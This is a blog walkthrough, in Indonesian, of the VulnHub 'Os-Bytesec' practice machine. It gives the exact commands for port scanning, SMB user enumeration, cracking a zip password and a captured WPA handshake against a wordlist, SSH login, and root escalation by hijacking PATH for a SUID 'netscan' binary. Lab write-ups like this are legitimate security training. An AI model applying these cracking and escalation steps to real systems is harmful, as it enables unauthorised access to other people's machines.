
---
title: "[VulnHub] Os-Bytesec WriteUp"
date: 2019-04-19T23:11:19-19:00
categories:
  - blog
tags:
  - vulnhub
  - writeup
  - easy
---

## Information Gathering
### nmap  
`nmap -sV -sC -p- bytesec.vh -oN initial.nmap -v`

```
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 5ECF6AFD7D00CCBE6B3C7AA8FD31BDE8
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Hacker_James
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2525/tcp open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 12:55:4f:1e:e9:7e:ea:87:69:90:1c:1f:b0:63:3f:f3 (RSA)
|   256 a6:70:f1:0e:df:4e:73:7d:71:42:d6:44:f1:2f:24:d2 (ECDSA)
|_  256 f0:f8:fd:24:65:07:34:c2:d4:9a:1f:c0:b8:2e:d8:3a (ED25519)
MAC Address: 08:00:27:B3:78:46 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Server menjalankan web server di port 80, dan SMB di 139 dan 445.
![index.html](/Os-Bytesec/index.jpg){: .img-content }

### dirb 
Saya sempat mencoba dirscanning dan menemukan file `news.png` di `/img`.
![news.png](/Os-Bytesec/news.png){: .img-content }
Hmm pakah mesin ini vuln BlueKeep ? :thinking:
>**BlueKeep** is a remote code execution vulnerability exists in Remote Desktop Services – formerly known as Terminal Services – when an unauthenticated attacker connects to the target system using RDP and sends specially crafted requests. This vulnerability is pre-authentication and requires no user interaction. An attacker who successfully exploited this vulnerability could execute arbitrary code on the target system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. ([_microsoft_](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708))

### enum4linux
Karena server menjalankan SMB, maka kita dapat mengumpulkan informasi yang berkaitan dengan SMB dengan tools enum4linux.

enum4linux adalah tools untuk melakukan enumerasi sistem Windows dan  Server Message Block (SMB/Samba) untuk mendapatkan informasi mulai dari domain, OS, versi SMB, hingga user yang ada dalam suatu domain.

```
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\sagar (Local User)
S-1-22-1-1001 Unix User\blackjax (Local User)
S-1-22-1-1002 Unix User\smb (Local User)
```

### smbclient
Dari hasil enumerasi enum4linux diatas kita mendapatkan 3 user, setelah dicoba satu-satu hanya user `smb` yang bisa login SMB.
`smbclient //bytesec.vh/smb -U smb -p `
```
smb: \> ls
  .                                   D        0  Mon Nov  4 18:50:37 2019
  ..                                  D        0  Mon Nov  4 18:37:28 2019
  main.txt                            N       10  Mon Nov  4 18:45:38 2019
  safe.zip                            N  3424907  Mon Nov  4 18:50:37 2019
```
Download file `save.zip` saja (karena ternyata `main.txt` cuma file txt isi kata "helo" doang).
### fcrackzip
Karena file `save.zip` ternyata berpassword,  kita bisa bruteforce passwordnya dengan menggunakan tools **fcrackzip**.
`fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u safe.zip`

```
PASSWORD FOUND!!!!: pw == hacker1smb:

```
Isi dari `safe.zip` adalah satu gambar dengan nama `secret.jpg` yang gak ada "secret-secret"--nya dan file `user.cap`.  
![deauth](/Os-Bytesec/deauth.jpg){: img_content }
Setelah lihat-lihat isi `user.cap` ternyata banyak sekali paket deauth yang tercapture, maka dapat disimpulkan ini adalah file _capture_-an dari bocah yang mau ngehek wifi pake `aireplay-ng`. Karena asumsinya itu adalah file _three-way handshake_ dari `airodump`/`aireplay`, maka kita bisa crack password yang tercapture dengan menggunakan `aircrack`.
`aircrack-ng -w /usr/share/wordlists/rockyou.txt user.cap`
```
Aircrack-ng 1.5.2 

      [00:00:14] 83800/7120712 keys tested (5232.31 k/s) 

      Time left: 22 minutes, 24 seconds                          1.18%

                           KEY FOUND! [ snowflake ]


      Master Key     : 8B A6 3F 95 1C E3 00 CA 30 C2 6E 63 59 61 35 42 
                       AB F7 73 5C D7 AD 3A 10 DB 21 51 64 DC 59 C6 8F 

      Transient Key  : 8E CC 35 6D EF 71 B7 2D 8D D5 03 3E 0D 5F 13 87 
                       BB 50 D3 85 31 BB 25 5A E7 AF 09 0D 85 42 6A 54 
                       60 CB 7F 40 7A E8 95 D5 A2 15 B1 19 66 17 64 CA 
                       7B FE 3D E6 66 6C B8 35 61 67 20 B2 8A C1 00 83 

      EAPOL HMAC     : 9D 5D 3B 71 C9 9E 71 31 58 38 53 A7 92 1C C5 48
```
Lalu apa informasi yang kita dapat? ESSID `user.cap` bernama blackjax dan key bernama `snowflake`. Hmm.. SSH! :smiley: 
## Exploitation
### User Flag
Dan ternyata kita berhasil login berdasarkan informasi yang kita dapat dari file `user.cap` tadi.
```
cat user.txt
  _    _  _____ ______ _____        ______ _               _____ 
 | |  | |/ ____|  ____|  __ \      |  ____| |        /\   / ____|
 | |  | | (___ | |__  | |__) |_____| |__  | |       /  \ | |  __ 
 | |  | |\___ \|  __| |  _  /______|  __| | |      / /\ \| | |_ |
 | |__| |____) | |____| | \ \      | |    | |____ / ____ \ |__| |
  \____/|_____/|______|_|  \_\     |_|    |______/_/    \_\_____|
                                                                 
                                                                 

Go To Root.

MD5-HASH : f589a6959f3e04037eb2b3eb0ff726ac
```
### Root Flag
Hal wajib yang perlu dilakukan untuk melakukan privesc di sistem Linux adalah melakukan enumerasi dengan [**linenum.sh**](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh). Cari direktori writeable dan jalankan file linenum disitu.  

Salah satu poin yang cukup interesting yaitu adanya file/program `netscan` di `/usr/bin/` yang mempunyai flag `SUID/SETUID`, flag tersebut berarti kita dapat menjalankan program tsb dengan mendapat privilege/permission sebagai root. File `netscan` menarik karena file/program tersebut tidak ada pada mesin pada umumnya.

#### Netscan
Rupanya program `netscan` hanya berupa "script" dari tools `netstat`.
```
blackjax@nitin:/tmp$ netscan
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:2525            0.0.0.0:*               LISTEN      1098/sshd       
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      861/smbd        
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      1041/mysqld     
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      861/smbd        
tcp        0    188 192.168.43.97:2525      192.168.43.192:46168    ESTABLISHED 4133/sshd: blackjax
tcp6       0      0 :::2525                 :::*                    LISTEN      1098/sshd       
tcp6       0      0 :::445                  :::*                    LISTEN      861/smbd        
tcp6       0      0 :::139                  :::*                    LISTEN      861/smbd        
tcp6       0      0 :::80                   :::*                    LISTEN      1129/apache2    
```
Maka dari itu dapat diasumsikan bahwa `netscan` hanyalah skrip buatan netadmin agar `netstat` hanya menampilkan koneksi `established`. Logika diatas dapat dimanfaatkan untuk privilege escalation.
#### PrivEsc
1. Pindah ke `/tmp`, karena attribute direktory `/tmp` drwxrwxrwx.
 `cd /tmp`
2. Buat file bernama "netstat" dengan isi "/bin/sh"
 `echo "bin/sh" > netstat`
3. Tambahkan direktori `/tmp` ke environtment variable / `$PATH` dengan urutan paling awal.
 `export PATH=/tmp:$PATH`
 4. Jalankan lagi `netscan`
 
 Setelah `netscan` dijalankan lagi, ternyata kita berhasil mendapat user root dan flag root :smiley:
```
    ____  ____  ____  ______   ________    ___   ______
   / __ \/ __ \/ __ \/_  __/  / ____/ /   /   | / ____/
  / /_/ / / / / / / / / /    / /_  / /   / /| |/ / __  
 / _, _/ /_/ / /_/ / / /    / __/ / /___/ ___ / /_/ /  
/_/ |_|\____/\____/ /_/____/_/   /_____/_/  |_\____/   
                     /_____/                           
Conguratulation..

MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b

Author : Rahul Gehlaut

Contact : https://www.linkedin.com/in/rahulgehlaut/

WebSite : jameshacker.me

```

Bingung kenapa logika tsb bisa jalan? _sama saya juga_
Ok jadi kunci keberhasilan privescnya adalah perubahan environtment variable / `$PATH`. Kita merubah **`netstat` asli** yang berisi tools untuk menampilkan koneksi aktif menjadi **"`netstat`" palsu** yang berisi command untuk memanggil shell. Umumnya dengan hanya merubah `netstat` asli menjadi `netstat` palsu kita juga tidak akan mendapat user root. Namun, karena kita menjalankan program **`netscan`** yang memiliki flag `SUID`, kita berhasil mendapat akses shell root.

Sederhananya, kita merekayasa "arah" pemanggilan file `netstat` pada program `netscan` yang seharusnya memanggil `/usr/bin/netstat` menjadi memanggil `/tmp/netstat` yang berisi perintah untuk memanggil shell. Ditambah dengan flag/attribute `SUID` yang ada di program `netscan`, maka yang terpanggil adalah shell root.

Sekian write up kali ini, see ya next time :love: 
 



